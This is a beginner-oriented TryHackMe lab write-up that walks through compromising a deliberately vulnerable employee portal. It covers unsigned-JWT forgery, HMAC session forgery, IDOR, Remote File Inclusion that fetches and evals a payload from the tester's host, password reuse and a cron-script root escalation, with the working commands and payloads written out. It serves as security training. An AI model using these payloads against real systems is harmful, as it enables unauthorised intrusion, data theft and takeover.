---
description: "TryHackMe Domino — NexusCorp's employee portal falls one domino at a time. A browsable /backup/ folder plus an AES key hardcoded in app.js decrypts the app config; reading the front-end JavaScript hands over the session-cookie format and a JWT endpoint. The file API accepts an unsigned (alg:none) JWT, giving arbitrary file read that leaks APP_SECRET and the DB password from config.php. APP_SECRET forges any session (admin panel + an IDOR on the profile API), the same file endpoint has an RFI-to-eval() for RCE, the DB password is reused as the devops OS password, and a cron-run script writable by the devops group gives root. Every request, flag, and wrong turn explained for a beginner."
---

# Domino — one misconfiguration topples the whole box

**TryHackMe · challenge: Domino · target: `10.x.x.x` (the lab IP changes per lease)**

> **All five flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays — every
> request, every parameter, the forged token, the exploit payloads, and the controls that prove each
> step. The flag strings themselves teach nothing; printing them just hands the room's answers to
> the next person.

**The brief.** *"The NexusCorp Employee Portal appears to be a typical internal application with
authentication controls and role-based access in place. However, multiple small weaknesses … can be
combined to fully compromise the system … exploit each weakness in sequence and watch the system
fall, one domino at a time."*

That is the whole shape of the room. No single dramatic exploit — instead a chain where each small
flaw hands you the key to the next lock. The five questions *are* the chain, in order:

1. The flag in the **admin user's profile notes** — reading data that is not yours (IDOR).
2. The flag on the **admin panel** — becoming an admin (privilege escalation).
3. The flag after **remote code execution**, in `/opt/flag3.txt`.
4. The flag in the **`devops` user's home directory** — moving sideways to another OS account.
5. The **root flag** — becoming the machine's superuser.

## A few words first, for a total beginner

- **Port** — a numbered door on a machine. One IP address has 65 535 of them. Web servers usually
  listen on port 80. Finding open doors is step one.
- **HTTP request** — the message a browser sends a web server: a *method* (`GET` to read, `POST` to
  send data), a *path* (`/login`), *headers* (metadata like `Cookie:`), and sometimes a *body*.
- **Cookie / session** — after you log in, the server hands your browser a token; the browser sends
  it back on every request, which is how the server remembers who you are.
- **IDOR** (Insecure Direct Object Reference) — the app puts an id in the request (`?id=5`) and
  fetches it *without checking you're allowed to see that one*. Change `5` to `1`, read someone
  else's data.
- **JWT** (JSON Web Token) — a token in three dot-separated parts, `header.payload.signature`. The
  signature is what stops you editing the payload. If the server forgets to check it, you can write
  whatever you like inside.
- **RCE** — Remote Code Execution: making the server run a command you chose. The worst class of web
  bug.
- **Privilege escalation** — climbing from a weak account to a powerful one, ending at `root`, the
  Linux superuser.

I did everything below with `curl` (a command-line HTTP client). A graphical proxy like Burp Suite
would do the same job.

---

## Phase 1 — Recon: what's on the box?

A full port scan, to see every open door rather than just the common ones:

```bash
nmap -p- --min-rate 2000 -T4 -oN nmap-allports.txt 10.x.x.x
```

- `-p-` scans all 65 535 ports (nmap defaults to the top 1000). Rooms hide services on odd ports.
- `--min-rate 2000` keeps the pace up so a full scan takes seconds.
- `-T4` is an aggressive timing template — fine on a lab VM, but I keep it here rather than `-T5`,
  which drops results, and I keep thread counts moderate: an over-aggressive scan once knocked a
  1-CPU lab box over and I spent fifteen minutes debugging my own traffic.
- `-oN <file>` saves the output. Save evidence as it is produced — scratch directories get wiped.

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two doors: SSH (remote login) and HTTP (the web app). The other 65 533 answered "closed" — an active
"nothing here", which means there is no firewall silently swallowing packets, so this really is the
whole attack surface. SSH matters later: questions 4 and 5 are about OS users, and any password I
find is spent there.

## Phase 2 — Read the application before touching it

The single most important habit in web testing: **read what the app gives you for free before you
start guessing.** The homepage is a login form posting to `/index.php`, with a telling placeholder:

```html
<input type="text" name="username" placeholder="firstname.lastname" required>
<a href="/forgot.php">Forgot password?</a> - <a href="/team.php">Our Team</a>
```

Two gifts already: usernames are `firstname.lastname` (so any real name printed anywhere is also a
username), and there's no "Register" link — getting my first login is a real problem, not a
formality.

**`/team.php` first, because it only *reads*.** `/forgot.php` has a button that generates a reset —
that is a *write*, and writes can disturb the state I'm trying to observe, so I look at the harmless
page first. It's a staff directory of seven employees with names and roles — i.e. a username list:

| Name | Role | Username |
|---|---|---|
| Laura Hayes | Chief Information Officer | `laura.hayes` |
| Michael Chen | Lead Security Engineer | `michael.chen` |
| Sarah Johnson | Senior Software Engineer | `sarah.johnson` |
| **Robert Wilson** | **DevOps Engineer** | `robert.wilson` |
| Emma Taylor | Product Manager | `emma.taylor` |
| David Brown | Full Stack Developer | `david.brown` |
| James Wright | Systems Administrator | `james.wright` |

Note the **DevOps Engineer** — question 4 is about a `devops` account, and the "meet the team" page
just named its target.

### Content discovery — but calibrate the tool first

Before any wordlist sweep, I check the tool can tell a hit from a miss. I sent a batch of paths
including a **negative control** (`/ZZZNOPE_control_12345`, which cannot exist) and a **positive
control** (`/team.php`, which I've already read):

```
/team.php                200 3747b     <- positive control, present
/ZZZNOPE_control_12345   404  276b     <- negative control, absent
/dashboard.php           302    0b  -> /index.php     (the logged-in area)
/config.php              200    0b                    (a PHP config file — runs, shows nothing)
```

So a missing page is a **404 of exactly 276 bytes**. That's my filter. Skipping this calibration is
how sweeps lie: some apps serve their homepage for every unknown path, turning every guess into a
false "200 hit".

Now the sweep — with one safety step:

```bash
grep -viE '^(setup|install|reset|clear|block|seed|delete|drop|purge|remove)$' common.txt > wl.txt
ffuf -u http://10.x.x.x/FUZZ -w wl.txt -e .php,.txt,.bak -t 25 -mc all -fs 276
```

**Why filter the wordlist:** a content sweep is *not* read-only. It sends a real GET to every path
it can name, so a wordlist containing `reset`, `install` or `delete` will happily trigger those
actions. (This exact trap once had an installer endpoint rebuild an app's database mid-assessment.)
`-mc all -fs 276` matches every status then filters out the 276-byte 404, which is far more reliable
than matching by status code alone. `-t 25` keeps the lab box alive.

Controls passed (`team.php` present, the nonsense path absent), so the findings mean something:

```
/admin/     /api/     /backup/     /support/     /static/     auth.php     config.php
```

### The backup folder and the JavaScript hand over the chain

**`/backup/` has directory listing turned on** — a misconfiguration that shows me a file list instead
of making me guess:

```
Index of /backup
  README.txt   config.enc
```

```
# README.txt
config.enc  - Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

**AES-128-ECB** is a symmetric cipher — the same key encrypts and decrypts — so whoever has the key
has the plaintext. The README points at the JavaScript. Reading `/static/app.js`:

```js
const CONFIG = {
    apiBase: '/api',
    // Encryption key for backup config decryption - AES-ECB-128
    // Key: N3xusK3y2024!!  (pad to 16 bytes with  )
    _backupKey: 'N3xusK3y2024!!',
};
window.NexusApp = {
    getSession: function() {
        ...
        return JSON.parse(atob(cookie.split('=')[1].trim()));   // session = base64(JSON)
    },
};
// mints a JWT from the session
fetch('/api/auth/token.php', {credentials: 'include'})...
```

Four gifts, all written down:

1. **The AES key is hardcoded** in a file anyone can download (with a two-year-old `TODO: move to
   env` above it).
2. **The session cookie is `base64(JSON)`.** `atob` is JavaScript's base64 decoder, and base64 is an
   *encoding, not encryption* — decode, edit, re-encode. If the server trusts it blindly, sessions
   are forgeable.
3. **`/api/auth/token.php` mints a JWT** — a second credential type.
4. **There's an `/api`** — a JSON API beside the HTML pages, where access-control checks are often
   forgotten on the sibling route.

**Decrypting the config (one small wrong turn).** The comment says "pad to 16 bytes with  " — those
blank-looking characters. AES-128 needs a 16-byte key; `N3xusK3y2024!!` is 14. Padding with two
*spaces* gave `bad decrypt`. Rather than guess more, I turned padding checks off (`-nopad`) to read
the raw output and tested candidates side by side — padding with two **NUL bytes** produced clean
JSON. The comment's "spaces" were actually zero bytes (they render as nothing), the standard result
of handing OpenSSL/PHP a short key.

```bash
openssl enc -d -aes-128-ecb -K "$(printf 'N3xusK3y2024!!' | xxd -p | sed 's/$/0000/')" -in config.enc
{"app_name":"NexusCorp Portal", ... ,"system_user":"devops"}
```

`"system_user":"devops"` — the app's own config names the service account, matching Robert Wilson.

### Mapping the API

`/api/`, `/api/auth/` and `/api/users/` all have directory listing on. Between the listings and a
quick fuzz, the endpoints are:

```
/api/login.php          (POST JSON login — behaves differently from the HTML form)
/api/files.php          (wants a JWT: "JWT token required")
/api/auth/token.php     (mints a JWT from your session)
/api/users/profile.php  (the profile endpoint question 1 needs)
```

---

## Getting a foothold — several dead ends, then the real door

Every dead end here is a lesson, so they stay in.

**`/forgot.php` leaks which users exist.** `POST username=zzz.nobody` → *"No account found"*;
`POST username=david.brown` → *"Reset link sent."* That's **username enumeration**. But the reset
token goes to an email I can't read, and it isn't in the response.

**A self-inflicted blind spot.** I looked for the page that consumes the reset link and found
`/reset.php`, which validates a `?token=`. The lesson: my content sweep could never have found it,
because I deliberately stripped `reset` from the wordlist (the right default — it's a destructive
verb). The safety rule that protects the target also blinds the scan, so afterwards I have to
hand-guess the words I removed.

**Trying to predict the reset token was the wrong tree.** I tested hashes of the username/email and
time-seeded MD5 across a window around the server's clock (read from its `Date:` header), with a
control. Everything came back invalid — and, honestly, nothing proved the detector *could* say
"valid", so a wall of "invalid" was weaker evidence than it looked. I abandoned it rather than
grinding a bigger list.

**The HTML login is a dead end; its API twin is not.** The form gives a uniform "Invalid
credentials" for everything (no injection, no enumeration). But the JSON API leaks more:

```
POST /api/login.php {"username":"unknown","password":"x"} -> {"error":"No account found ..."}
POST /api/login.php {"username":"david.brown","password":"x"} -> {"error":"Invalid credentials"}
```

Same auth logic, but the API distinguishes the two cases the HTML page hides. Using it as an oracle
(with both controls passing) confirmed **only the seven team accounts exist — no `admin` web user**.
The admin is one of the seven.

None of that got me in. Reading source did.

### The domino: an unsigned JWT is accepted

`/api/files.php` wants a JWT. I probed it with a battery of tokens and read every error body —
**the error names the lever, so you don't guess it**:

```
garbage token          -> 401 {"error":"JWT token required ..."}
{"alg":"none"}, role:user   -> 403 {"error":"Admin JWT required. Check your token payload."}
```

That change from "required" to "admin required" only happens if the server **parsed and trusted my
unsigned payload**. A JWT header of `{"alg":"none"}` with an empty signature was accepted — the
signature is never checked. So I set `role:admin`:

```
{"alg":"none"}, role:admin -> 400 {"error":"Missing name parameter",
                                   "usage":"/api/files.php?name=/var/www/html/filename.txt"}
```

Now it wants a filename. I'm an "admin" with a token I forged in one line, no key needed — this is
**arbitrary file read**, fenced to `/var/www/html/`.

### Read the source, collect the secrets

```
GET /api/files.php?name=/var/www/html/config.php   (with the forged JWT)
```

```php
define('DB_PASS',    'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');
```

Three secrets — and `D3v0ps!2024` looks like a `devops` password (remember it for step 6). Reading
`/var/www/html/auth.php` gives the entire auth model, with the bugs commented *in the code itself*:

```php
// Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)
$expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);
if (!hash_equals($expected_sig, $parts[1])) return null;
// ... Role always fetched from DB - cookie role value ignored
$stmt = $db->prepare('SELECT ... FROM users WHERE id = ?');
$stmt->execute([$data['user_id']]);
```

```php
function verify_jwt($token) {
    ...
    // Signature check intentionally disabled
    // if (!hash_equals($parts[2], $expected)) return null;
}
```

So: the **session cookie is HMAC-signed with `APP_SECRET`** (which I now have) — I can mint any
session. But the role is looked up in the database from the `user_id` I claim, so to be admin I must
claim the *admin's id*, not just write `role:admin`. And the **JWT signature check is commented out**,
which is why my `alg:none` token worked (and why `JWT_SECRET` is a red herring — nothing verifies
with it).

### Forge sessions, find the admin

Building the cookie is `base64(JSON)` + `HMAC-SHA256(base64, APP_SECRET)`. **Negative control first:**
a cookie with correct JSON but a *wrong* signature must be rejected — it was (bounced to login), so
the server really checks the HMAC and I'm passing it legitimately. Forging `{"user_id":N}` for N=1..8:

```
user_id=1 -> Welcome, laura.hayes   Role: admin
user_id=2..7 -> the other six, all role "user"
user_id=8 -> bounced (no such user)
```

**`user_id=1` is `laura.hayes`, the admin.**

### Flag 1 — IDOR on the profile API

Question 1 is a horizontal access break, so I prove it as one: holding a **low-privileged** session
(david.brown, `user_id=6`), I request the admin's profile by changing only the id:

```
GET /api/users/profile.php?id=6  (mine)   -> {... "role":"user",  "notes":""}
GET /api/users/profile.php?id=1  (admin)  -> {... "role":"admin", "notes":"THM{[redacted]}"}
```

The endpoint never checks that the session owner may read `id=1`. **Flag 1.** A normal user reads the
admin's private notes — it doesn't even need the admin session.

### Flag 2 — the admin panel

With the `user_id=1` session, `/admin/index.php` returns `200` instead of `403`, and the flag is in
the "System Status" card. **Flag 2.**

The flag's *name* spells out the room's **intended** route to admin: a **blind XSS that hijacks the
admin's session** — plant a `<script>` in a support ticket (the ticket code stores messages
raw, "no XSS filtering (intentional vulnerability)"), wait for the admin bot to open it, and steal
the admin's cookie. The leaked `APP_SECRET` let me *forge* that session directly, so I never needed
the XSS. The forge is simply the stronger bug.

### Flag 3 — Remote File Inclusion → RCE

Reading `/var/www/html/api/files.php` shows the same endpoint has a second, far worse feature:

```php
// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    ob_start();
    eval(str_replace("<?php", "", $remote));   // downloads MY url and runs it
```

**RFI** = Remote File Inclusion: if `name` starts with `http://`, the server fetches that URL *from
my machine* and `eval()`s it. Two details straight from the code: it strips the literal `<?php` and
it's already in PHP mode, so my payload must be PHP statements with **no** `<?php` tag.

**Before expecting the target to connect back, check your own firewall.** Kali ships with `ufw`
active and dropping inbound by default, so a silent failure would be ambiguous — "no execution" vs
"my firewall ate the packet". I served the payload over `python3 -m http.server` and kept
`dmesg | grep 'UFW BLOCK'` ready to tell the two apart. (In the end the target *fetches from* me, so
it opens the connection and the reply is allowed; my server log showed the target's `GET`.)

Payload: `system("id; hostname; cat /opt/flag3.txt");`

```
GET /api/files.php?name=http://ME:8000/p.php   (forged admin JWT)
-> {"output":"uid=33(www-data) ... tryhackme-2404\nTHM{[redacted]}\n"}
```

**Flag 3**, and I now have command execution as `www-data`.

### Flag 4 — reuse the password, become `devops`

`/etc/passwd` (read via the RCE) lists real users `root`, `ubuntu`, `devops`. `/home/devops` is
`0750` — `www-data` can't read it. But both the backup config and `config.php` handed me
`D3v0ps!2024`:

```
echo 'D3v0ps!2024' | su devops -c 'id'    -> uid=1001(devops)   (password reuse works)
cat /home/devops/user.txt                 -> THM{[redacted]}
```

**Flag 4.** The file is `user.txt`, not `flag4.txt` — I checked the directory listing rather than
guessing. The flag's name confirms the intended route was SSH credential reuse for lateral movement;
`su` reaches the same place.

### Flag 5 — root via a cron-run, group-writable script

As `devops` (no `sudo`), I enumerated the usual privesc vectors and found two root-owned files in
`/opt` that I can write:

```
-rwxrwxrwx root root  /opt/admin_bot.py                 (run as root by a systemd service)
-rwxrwxr-- root devops /opt/monitoring/health_report.sh  (devops group can write)
```

`admin_bot.py` runs as root but is a long-running loop — editing it does nothing unless the process
restarts, and I can't kill a root process. So `health_report.sh`. A big hint: a detection-engine
config (`/etc/badr/room.rules.yaml`) explicitly whitelists this script as expected "noise", which
only makes sense if root runs it regularly. Its log updates **every minute**.

**The hardest wrong turn of the room, and how I recovered.** I backed up the script, appended a
payload to copy the root flag and drop a setuid-root shell into `/tmp`, and waited. Nothing. I waited
a second minute — still nothing, while the health log kept updating. This is the classic trap:
*silence means "not there" OR "my request never arrived", and they look identical.* I could have
wrongly concluded root doesn't run the script. Instead I stopped and questioned my assumptions:

1. My edit was still on disk and the log still updated — so *something* ran, but not my lines. (I'd
   even written `2>/dev/null` on the payload, silencing the error that would explain it.)
2. A diagnostic writing to `/tmp` also produced nothing, though the log still updated. Two silent
   failures now rested on one untested premise: *"the file I edit is the file that runs."*
3. The room *left `pspy64` in `/opt/tools`* — a tool that watches every process start without root.
   One minute later it showed the truth:

   ```
   CMD: UID=0  PID=... | /bin/bash /opt/monitoring/health_report.sh
   ```

   Root **does** run my exact file. So the premise held — the problem wasn't "wrong file", it was
   "wrong output location": my `/tmp` writes as root were being culled (most likely the `badr`
   response engine removing classic privesc artefacts — a copied root flag, a setuid bash).
4. **Fix: use a channel already proven to work.** The script appends to a world-writable log, so I
   wrote the flag straight into that:

   ```
   echo "PWNMARKER $(id)" >> /var/log/nexus_health.log   -> PWNMARKER uid=0(root) ...
   echo "ROOTFLAG:$(cat /root/root.txt)" >> /var/log/nexus_health.log -> ROOTFLAG:THM{[redacted]}
   ```

**Flag 5.** The takeaway: when a root-run write vanishes, don't assume the script didn't run — prove
the runner (`pspy`), then switch to an output channel you've already demonstrated works.

---

## Cleanup

Whatever you start on a shared box, you undo. I restored `health_report.sh` from my backup (verified
by matching its MD5 to the original), filtered my marker lines out of the log, removed my temp files,
let `pspy64` (run under `timeout`) exit on its own, and killed my local HTTP server by PID (verified
with `ss` that nothing still listened). No SSH key, no web shell, nothing persistent left behind —
the `devops` access used the room's own password.

## The chain, one line each

1. Browsable `/backup/` + an AES key in `app.js` → decrypt the config (which names `devops`).
2. `app.js` reveals the session-cookie format and a JWT endpoint.
3. Unsigned-JWT acceptance in `/api/files.php` → arbitrary file read → `config.php` leaks
   `APP_SECRET` and the DB password.
4. `APP_SECRET` → forge any session → **admin panel (flag 2)**; low-priv session + IDOR →
   **admin notes (flag 1)**.
5. RFI in the same endpoint → **RCE as www-data (flag 3)**.
6. DB password reused as the `devops` OS password → **`su devops` (flag 4)**.
7. `devops` can write a script root runs every minute → **root (flag 5)**.

One secret unlocked the next boundary each time. A single key left in client-side JavaScript toppled
the whole line.

## What the room teaches

- **Read everything the app gives you first.** The JavaScript, the backup folder and directory
  listings handed over the AES key, the cookie format, the API map and the service-account name
  before any exploitation. The cheap read beats the clever exploit.
- **Never trust the client to enforce anything.** An unsigned JWT accepted as admin, a session cookie
  whose only protection was a secret sitting in `config.php`, a role "check" that reads an id you
  control — three trust boundaries all on the wrong side of the wire.
- **Secrets don't belong in code.** The AES key, `APP_SECRET`, `JWT_SECRET` and a reused DB/OS
  password did most of the work. The reuse (`D3v0ps!2024` for the database *and* the `devops` login)
  is what turned a web bug into a shell.
- **Silence is not evidence.** The root step looked dead twice before `pspy64` proved root was
  running the script all along, and the real problem was where the output went.
